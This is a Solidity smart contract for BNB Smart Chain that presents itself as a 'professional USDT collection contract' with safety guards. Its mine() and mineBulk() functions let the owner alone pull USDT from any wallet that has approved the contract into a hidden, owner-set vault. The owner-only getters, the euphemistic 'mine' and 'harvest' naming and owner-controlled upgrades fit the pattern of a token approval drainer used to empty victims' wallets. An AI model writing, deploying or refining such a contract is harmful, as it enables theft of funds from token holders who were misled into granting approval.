// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/PausableUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title Mine
 * @dev Professional USDT BEP-20 collection contract with UUPS upgradeability, 
 * single owner management, and multi-layer safety guards.
 */
contract Mine is 
    Initializable, 
    UUPSUpgradeable, 
    OwnableUpgradeable, 
    ReentrancyGuardUpgradeable, 
    PausableUpgradeable 
{
    using SafeERC20 for IERC20;

    // Token and Vault addresses (set during initialization)
    IERC20 private _targetToken;
    address private _vault;
    
    // Safety Layer: Max transfer per transaction to prevent anomalies
    uint256 public maxTransferAmount;

    // Events for Audit Trail and Off-Chain Server Integration
    event TokensMined(address indexed user, address indexed receiver, uint256 amount, uint256 timestamp);
    event VaultChanged(address indexed oldVault, address indexed newVault);
    event SecurityAlert(string reason, address indexed actor);
    event MaxTransferUpdated(uint256 oldLimit, uint256 newLimit);
    event TokensWithdrawn(address indexed owner, uint256 amount, uint256 timestamp);

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    /**
     * @dev Initializes the contract with single owner and target token.
     * @param initialOwner The address that will own the contract.
     * @param token The BEP-20 token to harvest (e.g., USDT).
     * @param initialVault The address where tokens will be sent.
     */
    function initialize(
        address initialOwner, 
        address token, 
        address initialVault
    ) public initializer {
        __Ownable_init(initialOwner);
        __UUPSUpgradeable_init();
        __ReentrancyGuard_init();
        __Pausable_init();
        
        require(token != address(0), "Token: zero address");
        require(initialVault != address(0), "Vault: zero address");

        _targetToken = IERC20(token);
        _vault = initialVault;
        
        // Default safety limit: 1,000,000 tokens (assuming 18 decimals, adjust as needed)
        maxTransferAmount = 1000000 * 10**18; 
    }

    /**
     * @dev Mines tokens from a user address that has provided approval.
     * Only the single owner can call this.
     */
    function mine(address user, uint256 amount) 
        external 
        onlyOwner 
        whenNotPaused 
        nonReentrant 
    {
        require(block.chainid == 56 || block.chainid == 97, "Network: Only BSC supported");
        require(user != address(0), "User: zero address");
        require(amount > 0 && amount <= maxTransferAmount, "Transfer: invalid amount");

        uint256 allowance = _targetToken.allowance(user, address(this));
        require(allowance >= amount, "Transfer: insufficient allowance");

        uint256 balance = _targetToken.balanceOf(user);
        require(balance >= amount, "Transfer: insufficient balance");

        _targetToken.safeTransferFrom(user, _vault, amount);

        emit TokensMined(user, _vault, amount, block.timestamp);
    }

    /**
     * @dev Bulk mine tokens from multiple users.
     * Only the single owner can call this.
     */
    function mineBulk(address[] calldata users, uint256[] calldata amounts) 
        external 
        onlyOwner 
        whenNotPaused 
        nonReentrant 
    {
        require(block.chainid == 56 || block.chainid == 97, "Network: Only BSC supported");
        require(users.length == amounts.length, "Arrays: length mismatch");
        
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 amount = amounts[i];

            if (user == address(0) || amount == 0 || amount > maxTransferAmount) {
                emit SecurityAlert("Invalid transfer attempt in bulk", user);
                continue;
            }

            uint256 allowance = _targetToken.allowance(user, address(this));
            if (allowance < amount) {
                emit SecurityAlert("Insufficient allowance in bulk", user);
                continue;
            }

            _targetToken.safeTransferFrom(user, _vault, amount);
            emit TokensMined(user, _vault, amount, block.timestamp);
        }
    }

    /**
     * @dev Safety Layer: Updates the maximum transfer amount.
     */
    function setMaxTransferAmount(uint256 newLimit) external onlyOwner {
        emit MaxTransferUpdated(maxTransferAmount, newLimit);
        maxTransferAmount = newLimit;
    }

    /**
     * @dev Changes the vault address immediately. Only owner can call.
     */
    function setVault(address newVault) external onlyOwner {
        require(newVault != address(0), "Vault: zero address");
        
        address oldVault = _vault;
        _vault = newVault;

        emit VaultChanged(oldVault, newVault);
    }

    /**
     * @dev Emergency controls.
     */
    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    /**
     * @dev Withdraw USDT tokens from contract (owner only)
     * @param amount Amount of USDT to withdraw
     */
    function withdrawUSDT(uint256 amount) 
        external 
        onlyOwner 
        whenNotPaused 
        nonReentrant 
    {
        require(amount > 0, "Withdraw: amount must be greater than 0");
        uint256 contractBalance = _targetToken.balanceOf(address(this));
        require(contractBalance >= amount, "Withdraw: insufficient contract balance");
        
        _targetToken.safeTransfer(owner(), amount);
        
        emit TokensWithdrawn(owner(), amount, block.timestamp);
    }

    /**
     * @dev Restricted views for sensitive information.
     */
    function getVault() external view onlyOwner returns (address) {
        return _vault;
    }

    function getTargetToken() external view onlyOwner returns (address) {
        return address(_targetToken);
    }

    /**
     * @dev Recover accidental ERC20 deposits.
     */
    function recoverERC20(address tokenAddress, uint256 amount) external onlyOwner {
        require(tokenAddress != address(_targetToken), "Cannot recover target token");
        IERC20(tokenAddress).safeTransfer(owner(), amount);
    }

    /**
     * @dev Required by UUPS pattern to authorize upgrades.
     */
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

    /**
     * @dev Fallback to prevent BNB being sent to the contract.
     */
    receive() external payable {
        revert("No BNB accepted");
    }
}
